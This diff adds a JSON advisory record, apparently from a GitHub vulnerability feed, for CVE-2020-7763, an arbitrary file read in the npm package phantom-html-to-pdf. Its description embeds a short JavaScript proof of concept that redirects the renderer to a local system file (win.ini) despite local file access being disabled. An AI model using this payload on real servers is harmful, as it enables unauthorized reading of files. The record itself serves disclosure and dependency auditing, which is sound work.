@@ -1,0 +1,33 @@
+{
+  "packageName": "phantom-html-to-pdf",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-6h7f-qwqm-35pp",
+      "packageName": "phantom-html-to-pdf",
+      "title": "Arbitrary File Read in phantom-html-to-pdf",
+      "description": "This affects the package phantom-html-to-pdf before 0.6.1.\n\n### PoC\n```js\nvar fs = require('fs') var conversion = require(\"phantom-html-to-pdf\")();\nconversion.allowLocalFilesAccess = false conversion({\n    html: \"document.write(window.location='c:/windows/win.ini')\"\n}, function(err, pdf) {\n    var output = fs.createWriteStream('output.pdf') console.log(pdf.logs);\n    console.log(pdf.numberOfPages);\n    pdf.stream.pipe(output);\n});\n```",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-6h7f-qwqm-35pp",
+      "publishedAt": "2020-11-06T18:06:16Z",
+      "modifiedAt": "2023-09-07T22:36:43Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-6h7f-qwqm-35pp"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2020-7763"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "< 0.6.1",
+          "fixed": "0.6.2"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
